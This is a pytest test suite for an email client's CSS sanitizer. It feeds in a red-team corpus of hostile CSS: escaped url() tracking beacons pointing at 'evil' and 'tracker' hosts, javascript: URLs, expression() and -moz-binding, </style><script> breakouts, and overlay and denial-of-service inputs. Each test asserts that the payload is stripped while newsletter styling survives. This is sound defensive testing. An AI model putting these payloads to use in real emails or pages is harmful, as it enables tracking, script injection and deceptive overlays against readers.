"""Attack corpus for the CSS sanitizer. Each red-team payload must be neutralized; legitimate
newsletter styling must survive. Pure functions: no data directory, no app."""
import pytest

from mailmind.content.sanitize import html as S


class Ctx:
    """Minimal stand-in for _San: the CSS layer only touches these attrs."""
    def __init__(self, load_images=False):
        self.load_images = load_images
        self.blocked_images = 0
        self.blocked_css_urls = 0


def inline(v, load_images=False):
    c = Ctx(load_images)
    return S.sanitize_inline_style(v, c), c


def sheet(css, load_images=False):
    c = Ctx(load_images)
    return S.sanitize_css_stylesheet(css, c), c


# ── W1/W3: decode-desync — escaped url() must be decoded BEFORE gating ────────
@pytest.mark.parametrize("value, host", [
    pytest.param(r"background-image:\75rl(http://tracker/beacon.png)", "tracker", id="escaped_url_keyword"),
    pytest.param(r"background:url\28http://tracker/x.png\29", "tracker", id="escaped_url_paren"),
    pytest.param(r"background:u\72 l(http://evil/p.png)", "evil", id="split_url_letters"),   # \72 == 'r'
])
def test_escaped_url_is_gated(value, host):
    out, _ = inline(value)
    assert host not in out and "url(" not in out.lower()


def test_residual_backslash_after_decode_drops():
    # A TRUE residual backslash (\\ -> one literal \) is malformed/recursive -> drop, even with consent.
    out, _ = inline(r"background:url(https://evil\\x.png)", load_images=True)
    assert out == ""
    # \/ is a LEGIT escaped slash: decodes cleanly to a valid URL, so it is correctly GATED
    # (blocked, no beacon) without consent — not silently passed.
    out2, c2 = inline(r"background:url(https:\/\/evil/y.png)", load_images=False)
    assert out2 == "" and c2.blocked_css_urls == 1


def test_emit_copy_equals_match_copy_no_reexpand():
    out, _ = inline(r"width:expr/* */ession(alert(1))")
    assert out == ""


# ── W2: §4 contradiction — any bad url() token drops the WHOLE declaration ────
def test_multi_url_data_plus_remote_drops_entire_decl():
    out, c = inline(
        "background:url(data:image/png;base64,AAAA) , url(https://evil/beacon?id=USER)",
        load_images=False)
    assert "evil" not in out and "data:image" not in out
    assert c.blocked_css_urls == 1


def test_remote_url_blocked_counts_once():
    out, c = inline("background:url(https://t/a) , url(https://t/b)", load_images=False)
    assert out == "" and c.blocked_css_urls == 1


# ── url() scheme gating, and what consent to load images doesn't change ──────
@pytest.mark.parametrize("value", [
    pytest.param("background:url(data:image/svg+xml;base64,PHN2Zz4=)", id="data_svg_url"),
    pytest.param("background:url(javascript:alert(1))", id="javascript_url"),
    pytest.param("color:url(https://evil/x)", id="url_on_nonurl_property"),
    pytest.param("background:var(--x, url(http://tracker))", id="var_function"),
])
def test_dropped_even_with_consent(value):
    assert inline(value, load_images=True)[0] == ""


def test_data_png_url_kept_without_consent():
    out, c = inline("background-image:url(data:image/png;base64,iVBORw0KGgo=)",
                    load_images=False)
    assert out.startswith("background-image:url(")
    assert "data:image/png" in out and c.blocked_css_urls == 0


def test_remote_url_kept_with_consent():
    out, c = inline("background:url(https://cdn.example.com/hero.png)", load_images=True)
    assert 'url("https://cdn.example.com/hero.png")' in out and c.blocked_css_urls == 0


# ── value denylist, and overlay / curtain hardening ──────────────────────────
@pytest.mark.parametrize("value", [
    pytest.param("width:expression(alert(1))", id="expression"),
    pytest.param("behavior:url(#default#xss)", id="behavior"),
    pytest.param("-moz-binding:url(http://evil/x.xml)", id="moz_binding"),
    pytest.param("font-family:'</style><script>'", id="angle_bracket_in_value"),
    pytest.param("position:fixed", id="position_fixed"),
    pytest.param("position:absolute", id="position_absolute"),
    pytest.param(r"position:f\69xed", id="position_escaped_fixed"),   # \69 == 'i' -> fixed -> dropped
    pytest.param("height:100vh", id="viewport_height_curtain"),
    pytest.param("min-height:100vh", id="viewport_min_height_curtain"),
    pytest.param("height:100%", id="percent_height_curtain"),
    pytest.param("z-index:9999", id="zindex"),
    pytest.param("transform:translateY(-100px)", id="transform"),
])
def test_dropped(value):
    assert inline(value)[0] == ""


def test_position_relative_kept():
    assert inline("position:relative")[0] == "position:relative"


# ── <style> block / breakout ─────────────────────────────────────────────────
def test_import_rule_dropped():
    out, _ = sheet('@import url(http://evil/x.css); p{color:red}')
    assert "evil" not in out and "@import" not in out
    assert "color:red" in out


def test_font_face_dropped():
    out, _ = sheet('@font-face{font-family:x;src:url(http://evil/f.woff)}')
    assert "evil" not in out and "@font-face" not in out


def test_style_breakout_neutralized():
    out, _ = sheet('p{color:red}</style><script>alert(1)</script>')
    assert "<" not in out and ">" not in out and "script" not in out.lower()


def test_media_query_recurses_and_keeps_safe():
    out, _ = sheet('@media (max-width:600px){ .a{color:#333} }')
    assert "@media" in out and "color:#333" in out


def test_media_with_url_prelude_dropped():
    out, _ = sheet('@media url(evil){ .a{color:red} }')
    assert "evil" not in out


def test_keyframes_dropped():
    out, _ = sheet('@keyframes spin{from{opacity:0}to{opacity:1}}')
    assert "@keyframes" not in out and "spin" not in out


def test_selector_with_angle_bracket_drops_rule():
    out, _ = sheet('a<b{color:red}')
    assert "color:red" not in out and "<" not in out


# ── the stylesheet's reader: nothing desyncs it, and what won't end ends the sheet ──
@pytest.mark.parametrize("css, out", [
    pytest.param('p{font-family:"a}b";color:red}', 'p{font-family:"a}b";color:red}', id="brace_in_a_string"),
    pytest.param('@import "x;{y";p{color:red}', "p{color:red}", id="at_rule_quoting_a_semicolon_and_a_brace"),
    pytest.param("@page{margin:0}p{color:red}", "p{color:red}", id="dropped_at_rule_with_a_block"),
    pytest.param("@foo bar;p{color:red}", "p{color:red}", id="unknown_at_rule"),
    pytest.param("@media screen;p{color:red}", "p{color:red}", id="media_with_no_block"),
    pytest.param("p{color:red}}q{color:blue}", "p{color:red}q{color:blue}", id="stray_close_brace"),
    pytest.param("@supports (display:grid){p{color:red}}", "@supports (display:grid){p{color:red}}", id="supports"),
    pytest.param("@media a{@media b{@media c{p{color:red}}}}", "@media a{@media b{@media c{p{color:red}}}}", id="nested_3"),
    pytest.param("@media a{@media b{@media c{@media d{p{color:red}}}}}", "", id="nested_past_the_cap"),
])
def test_the_sheet_reads_each_rule_whole(css, out):
    assert sheet(css)[0] == out


@pytest.mark.parametrize("css", [
    pytest.param('p{color:red}"abc q{color:blue}', id="string"),
    pytest.param("p{color:red}/* x q{color:blue}", id="comment"),
    pytest.param("p{color:red}@media screen", id="at_rule_that_never_opens"),
    pytest.param("p{color:red}@media screen{q{color:blue}", id="at_rule_that_never_closes"),
    pytest.param('p{color:red}q{content:"abc}r{color:blue}', id="string_in_a_block"),
    pytest.param("p{color:red}q{color:blue;/* x", id="comment_in_a_block"),
])
def test_what_never_ends_ends_the_sheet_where_it_starts(css):
    assert sheet(css)[0] == "p{color:red}"


def test_a_sheet_is_read_to_its_cap_of_rules():
    assert sheet("p{color:red}" * (S._CSS_SHEET_RULES + 1))[0] == "p{color:red}" * S._CSS_SHEET_RULES


def test_a_sheet_is_read_to_its_cap_of_text():
    assert sheet("p{color:red}" + " " * S._CSS_SHEET_MAX + "q{color:blue}")[0] == "p{color:red}"


# ── DoS bounds ───────────────────────────────────────────────────────────────
def test_oversized_inline_dropped_fast():
    out, _ = inline("color:red;" + "A" * 100_000)
    assert out == ""                       # > 4096 raw cap -> dropped pre-normalize


def test_unterminated_comment_no_hang():
    out, _ = sheet("p{color:red} /* unterminated " + "x" * 10_000)
    assert "color:red" in out


def test_unterminated_brace_no_hang():
    out, _ = sheet("p{color:red")
    assert isinstance(out, str)


# ── legitimate newsletter styling SURVIVES ───────────────────────────────────
@pytest.mark.parametrize("fragment", ["color:#1a1a1a", "font-size:16px", "background-color:#fbf7ef",
                                      "border-radius:8px", "text-align:center"])
def test_newsletter_inline_styles_survive(fragment):
    out, _ = inline("color:#1a1a1a; font-family:Helvetica,Arial,sans-serif; "
                    "font-size:16px; line-height:1.5; padding:12px 16px; "
                    "background-color:#fbf7ef; border-radius:8px; text-align:center")
    assert fragment in out


def test_newsletter_data_image_hero_survives():
    out, c = inline("background-image:url(data:image/jpeg;base64,/9j/4AAQSkZJRg==)",
                    load_images=False)
    assert "data:image/jpeg" in out and c.blocked_css_urls == 0


def test_newsletter_stylesheet_survives():
    css = ('.btn{background-color:#0a66c2;color:#fff;padding:10px 18px;'
           'border-radius:6px;text-decoration:none;display:inline-block}'
           '@media (max-width:480px){.btn{display:block;width:100%}}')
    out, _ = sheet(css)
    assert "background-color:#0a66c2" in out
    assert "border-radius:6px" in out
    assert "@media" in out


def test_font_casing_preserved():
    out, _ = inline("font-family:Georgia,'Times New Roman',serif")
    assert "Georgia" in out


def test_text_shadow_and_box_shadow_kept():
    out, _ = inline("text-shadow:1px 1px 2px #000; box-shadow:0 2px 4px rgba(0,0,0,.2)")
    assert "text-shadow:" in out and "box-shadow:" in out
